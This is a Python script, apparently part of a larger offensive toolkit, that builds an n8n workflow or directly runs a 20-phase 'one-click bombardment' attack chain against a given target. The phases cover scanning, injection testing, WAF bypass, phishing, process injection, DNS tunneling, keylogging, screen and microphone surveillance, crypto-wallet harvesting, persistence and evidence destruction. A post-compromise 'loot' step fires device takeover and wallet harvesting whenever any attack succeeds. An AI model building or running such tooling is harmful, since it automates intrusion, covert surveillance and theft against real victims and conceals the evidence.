# 开发者：自由的风
"""n8n_attack_chain/run.py — N8N全攻击链·一键轰炸
==================================================
攻击域 core — 收到目标→全部攻击能力并发→不给机会→直接轰炸。
部署为N8N工作流 + 纯Python直接执行双模式。
"""
import sys, json, os, subprocess, time, threading, re
from pathlib import Path
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

SANDBOX = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CAPS_DIR = Path(SANDBOX)
N8N_DIR = Path.home() / ".gbt" / "n8n"
N8N_DIR.mkdir(parents=True, exist_ok=True)

# ═══════════════════════════════════════════════════════════
#  全攻击链路定义 — 20阶段·55连发
# ═══════════════════════════════════════════════════════════

ATTACK_CHAIN = [
    # 阶段1: 隐身
    {"phase": "隐身部署", "caps": [
        ("anti_track", "rotate_identity", None, "轮换身份指纹"),
    ]},
    # 阶段2: 全维度侦察(并发)
    {"phase": "侦察覆盖", "caps": [
        ("port_scanner", "scan", lambda t: {"host": t, "ports": "1-1000"}, "全端口扫描"),
        ("subdomain_enum", "enum", lambda t: {"domain": t}, "子域名枚举"),
        ("dir_buster", "scan", lambda t: {"url": "http://"+t}, "目录爆破"),
        ("osint_master", "search", lambda t: {"target": t}, "OSINT深度情报"),
        ("osint_aggregator", "aggregate", lambda t: {"target": t}, "OSINT聚合"),
        ("net_sniffer", "capture", lambda t: {"target": t}, "网络流量嗅探"),
        ("darknet_scanner", "scan", lambda t: {"target": t}, "暗网情报扫描"),
    ]},
    # 阶段3: Web漏洞轰炸(并发)
    {"phase": "漏洞轰炸", "caps": [
        ("sqli_tester", "test", lambda t: {"url": "http://"+t}, "SQL注入"),
        ("xss_tester", "test", lambda t: {"url": "http://"+t}, "XSS检测"),
        ("command_injector", "test", lambda t: {"target": t}, "命令注入"),
        ("jwt_tester", "test", lambda t: {"url": "http://"+t}, "JWT测试"),
        ("api_tester", "test", lambda t: {"url": "http://"+t}, "API探测"),
    ]},
    # 阶段4: WAF绕过
    {"phase": "WAF穿透", "caps": [
        ("waf_bypass", "bypass", lambda t: {"target": t}, "WAF绕过"),
    ]},
    # 阶段5: 综合渗透+Kali
    {"phase": "综合打击", "caps": [
        ("strix", "deep", lambda t: {"target": t, "max_depth": 3, "auto_exploit": True}, "全链路穿透"),
        ("bounty_hunter", "hunt", lambda t: {"target": t}, "赏金狩猎"),
        ("pentest_kali", "run", lambda t: {"target": t}, "Kali工具链"),
    ]},
    # 阶段6: 代码层分析
    {"phase": "代码穿透", "caps": [
        ("code_scanner", "scan_response", lambda t, r=None: {"body": json.dumps(r or {}, ensure_ascii=False)[:8000], "source": t}, "代码弱点扫描"),
    ]},
    # 阶段7: 安全扫描
    {"phase": "安全审计", "caps": [
        ("security_scan", "scan", lambda t, r=None: {"code": json.dumps(r or {}, ensure_ascii=False)[:10000]}, "密钥泄露扫描"),
    ]},
    # 阶段8: 社会工程
    {"phase": "社会工程", "caps": [
        ("phishing_engine", "launch", lambda t: {"target": t}, "钓鱼攻击"),
        ("social_engineer", "profile", lambda t: {"target": t}, "社工画像"),
    ]},
    # 阶段9: 进程注入+隧道
    {"phase": "进程劫持", "caps": [
        ("process_injector", "inject", lambda t: {"target": t}, "进程注入"),
        ("dns_tunneler", "tunnel", lambda t: {"target": t}, "DNS隧道"),
    ]},
    # 阶段10: 网络层攻击
    {"phase": "网络渗透", "caps": [
        ("packet_crafter", "craft", lambda t: {"target": t}, "数据包构造"),
        ("encryption_engine", "encrypt", lambda t: {"target": t}, "加密/解密"),
    ]},
    # 阶段11: 内存分析
    {"phase": "内存分析", "caps": [
        ("memory_dumper", "dump", None, "内存转储分析"),
    ]},
    # 阶段12: 桌面劫持
    {"phase": "桌面接管", "caps": [
        ("desktop_master", "autopilot", None, "桌面操控"),
        ("win_control", "control", None, "Windows原生控制"),
        ("sys_control", "control", None, "系统级控制"),
        ("fingerprint_engine", "generate", None, "浏览器指纹"),
        ("browser_automation", "run", None, "浏览器自动化"),
        ("computer_use", "run", None, "AI电脑操控"),
    ]},
    # 阶段13: 键盘+剪贴板劫持
    {"phase": "输入劫持", "caps": [
        ("keylogger", "start", None, "键盘记录"),
        ("clipboard_monitor", "start", None, "剪贴板监控"),
    ]},
    # 阶段14: 全视觉监视
    {"phase": "视觉监视", "caps": [
        ("native_vision", "start_watching", {"fps": 15}, "原生视觉持续监视"),
        ("omni_eye", "see", None, "UIA窗口遍历"),
        ("screen_ocr", "read_all", None, "OCR屏幕文字"),
        ("local_eye", "scan", None, "本地视觉扫描"),
        ("ai_vision", "screen", None, "AI视觉分析"),
        ("screenpipe_monitor", "start", None, "持续屏幕监控"),
    ]},
    # 阶段15: 音频监听
    {"phase": "音频接管", "caps": [
        ("audio_capture", "record", None, "麦克风录音"),
    ]},
    # 阶段16: 反追踪
    {"phase": "反制追踪", "caps": [
        ("anti_track", "capture_attacker", None, "捕获攻击者"),
    ]},
    # 阶段17: WiFi扫描
    {"phase": "网络侦察", "caps": [
        ("wifi_scanner", "scan", None, "WiFi扫描"),
    ]},
    # 阶段18: 加密资产收割
    {"phase": "资产收割", "caps": [
        ("crypto_harvester", "harvest", None, "加密钱包收割"),
    ]},
    # 阶段19: 持久化控制
    {"phase": "持久控制", "caps": [
        ("cradle_task", "deploy", None, "持续任务托管"),
        ("desktop_type", "type", None, "桌面自动化输入"),
    ]},
    # 阶段20: 收尾清理
    {"phase": "收尾清理", "caps": [
        ("device_takeover", "destroy_evidence", None, "销毁证据"),
        ("report_generator", "generate", lambda t: {"type": "渗透测试", "target": t}, "生成报告"),
    ]},
]


def _call_cap(cap_id, action, params, timeout=90):
    run_py = CAPS_DIR / cap_id / "run.py"
    if not run_py.exists():
        return {"ok": False, "error": "cap {} 不存在".format(cap_id)}
    try:
        r = subprocess.run(
            [sys.executable, str(run_py), action, json.dumps(params or {}, ensure_ascii=False)],
            capture_output=True, text=True, timeout=timeout,
            cwd=str(SANDBOX), encoding="utf-8", errors="replace"
        )
        return json.loads((r.stdout or "{}").strip())
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "超时({}s)".format(timeout)}
    except Exception as e:
        return {"ok": False, "error": str(e)[:100]}


# ═══════════════════════════════════════════════════════════
#  N8N工作流生成
# ═══════════════════════════════════════════════════════════

def do_generate_n8n(params):
    """生成N8N工作流JSON"""
    target_field = params.get("target_field", "target")
    
    nodes = []
    connections = {}
    y_pos = 250
    
    # Webhook触发器
    nodes.append({
        "id": "trigger",
        "name": "GBT Attack Trigger",
        "type": "n8n-nodes-base.webhook",
        "position": [400, 100],
        "parameters": {"httpMethod": "POST", "path": "gbt-attack", "responseMode": "lastNode"},
    })
    prev_node = "trigger"

    for i, phase in enumerate(ATTACK_CHAIN):
        phase_name = phase["phase"]
        caps = phase["caps"]
        
        for j, (cap_id, action, param_fn, desc) in enumerate(caps):
            node_id = "{}_{}".format(cap_id, action)
            
            # Execute Command节点(调用Python脚本)
            cmd = "python caps/{}/run.py {} '{{\"{}\":\"{{{{$json.{}}}}}\"}}'".format(
                cap_id, action, target_field, target_field)
            
            nodes.append({
                "id": node_id,
                "name": "{} / {}".format(cap_id, desc),
                "type": "n8n-nodes-base.executeCommand",
                "position": [400 + j * 350, y_pos],
                "parameters": {"command": cmd},
            })
            
            # 连接: 前一个节点→当前节点
            if prev_node not in connections:
                connections[prev_node] = {"main": [[]]}
            
            target_list = connections[prev_node]["main"][0] if connections[prev_node]["main"] else []
            connections[prev_node]["main"] = [[{"node": node_id, "type": "main", "index": 0}]]
            
            connections[node_id] = {"main": [[]]}
            prev_node = node_id
        
        y_pos += 180

    workflow = {
        "name": "GBT Full Attack Chain",
        "nodes": nodes,
        "connections": connections,
        "settings": {"executionOrder": "v1"},
    }

    fpath = N8N_DIR / "gbt_attack_chain.json"
    fpath.write_text(json.dumps(workflow, ensure_ascii=False, indent=2), encoding="utf-8")

    return {
        "ok": True,
        "cap": "n8n_attack_chain",
        "action": "generate_n8n",
        "domain": "攻击域",
        "workflow_file": str(fpath),
        "phases": len(ATTACK_CHAIN),
        "total_nodes": len(nodes),
        "import_instructions": "N8N → Import from File → 选择 {}".format(fpath.name),
    }


# ═══════════════════════════════════════════════════════════
#  直接轰炸模式(无需N8N)
# ═══════════════════════════════════════════════════════════

def do_bombard(params):
    """一键轰炸 — 全攻击链并发执行"""
    target = params.get("target", params.get("url", params.get("host", "")))
    if not target:
        return {"ok": False, "error": "缺少 target/url/host 参数"}
    
    target = target.strip().replace("http://", "").replace("https://", "").rstrip("/")
    mode = params.get("mode", "parallel")  # parallel / sequential / phased
    
    start_time = time.time()
    phase_results = {}
    total_attacks = 0
    total_success = 0
    all_findings = []

    if mode == "parallel":
        # 全部并发 — 真正的轰炸
        all_tasks = []
        for phase in ATTACK_CHAIN:
            for cap_id, action, param_fn, desc in phase["caps"]:
                try: cap_params = param_fn(target) if callable(param_fn) else {}
                except TypeError: cap_params = param_fn(target, {}) if callable(param_fn) else {}
                if not cap_params: cap_params = {}
                all_tasks.append((phase["phase"], cap_id, action, cap_params, desc))
        
        def _run_one(task):
            phase_name, cap_id, action, cap_params, desc = task
            try:
                result = _call_cap(cap_id, action, cap_params, timeout=60)
                return {"phase": phase_name, "cap": cap_id, "action": action,
                        "desc": desc, "ok": result.get("ok", False), "result": result}
            except Exception as e:
                return {"phase": phase_name, "cap": cap_id, "ok": False, "error": str(e)[:100]}
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(_run_one, t) for t in all_tasks]
            for f in as_completed(futures):
                r = f.result()
                phase_name = r["phase"]
                if phase_name not in phase_results:
                    phase_results[phase_name] = []
                phase_results[phase_name].append(r)
                total_attacks += 1
                if r["ok"]:
                    total_success += 1
                    # 收集发现
                    res = r.get("result", {})
                    findings = (res.get("total_findings") or res.get("findings") or
                               res.get("vulnerable_count") or res.get("weakness_findings") or
                               res.get("open_ports") or res.get("alive_count"))
                    if findings:
                        all_findings.append({"cap": r["cap"], "findings": findings})
    
    elif mode == "phased":
        # 分阶段并发
        for phase in ATTACK_CHAIN:
            phase_name = phase["phase"]
            phase_results[phase_name] = []
            tasks = []
            for cap_id, action, param_fn, desc in phase["caps"]:
                try: cap_params = param_fn(target) if callable(param_fn) else {}
                except TypeError: cap_params = param_fn(target, {}) if callable(param_fn) else {}
                if not cap_params: cap_params = {}
                tasks.append((cap_id, action, cap_params, desc))
            
            def _run_phased(task):
                cap_id, action, cap_params, desc = task
                result = _call_cap(cap_id, action, cap_params, timeout=60)
                return {"cap": cap_id, "action": action, "desc": desc,
                        "ok": result.get("ok", False), "result": result}
            
            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = [executor.submit(_run_phased, t) for t in tasks]
                for f in as_completed(futures):
                    r = f.result()
                    phase_results[phase_name].append(r)
                    total_attacks += 1
                    if r["ok"]:
                        total_success += 1

    elapsed = round(time.time() - start_time, 1)

    # ★ 攻破后立即触发: 全维度收割
    loot_results = {}
    if total_success > 0:
        loot_results["device_takeover"] = _call_cap("device_takeover", "full_takeover", {}, timeout=30)
        loot_results["crypto_harvest"] = _call_cap("crypto_harvester", "harvest", {}, timeout=30)
        loot_results["native_vision"] = _call_cap("native_vision", "see", {}, timeout=10)
        loot_results["keylogger"] = _call_cap("keylogger", "start", {}, timeout=10)
        loot_results["clipboard"] = _call_cap("clipboard_monitor", "start", {}, timeout=10)
        loot_results["audio"] = _call_cap("audio_capture", "record", {"duration": 10}, timeout=15)

    return {
        "ok": True,
        "cap": "n8n_attack_chain",
        "action": "bombard",
        "domain": "攻击域",
        "target": target,
        "mode": mode,
        "elapsed_sec": elapsed,
        "phases_executed": len([p for p in phase_results if phase_results[p]]),
        "total_attacks": total_attacks,
        "successful": total_success,
        "failed": total_attacks - total_success,
        "findings_summary": all_findings,
        "phase_results": {k: [{"cap": r["cap"], "ok": r["ok"]} for r in v] for k, v in phase_results.items()},
        "loot_phase": loot_results,
        "verdict": (
            "轰炸完成+已收割: {}/{} 攻击成功".format(total_success, total_attacks)
            if total_success > 0 else "轰炸结束: 无成功攻击"
        ),
    }


def do_export_n8n(params):
    """导出N8N工作流+直接轰炸"""
    n8n_result = do_generate_n8n(params)
    bombard_result = do_bombard(params)
    return {
        "ok": True,
        "n8n_workflow": n8n_result,
        "direct_bombard": bombard_result,
        "note": "N8N工作流已导出, 直接轰炸已完成。双模式就绪。",
    }


HANDLERS = {
    "bombard": do_bombard,
    "generate": do_generate_n8n,
    "export": do_export_n8n,
}

if __name__ == "__main__":
    action = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") else "bombard"
    params_str = sys.argv[2] if len(sys.argv) > 2 else "{}"
    try:
        params = json.loads(params_str)
    except:
        params = {}
    handler = HANDLERS.get(action)
    result = handler(params) if handler else {"ok": False, "error": "未知:{}".format(action)}
    print(json.dumps(result, ensure_ascii=False, default=str))
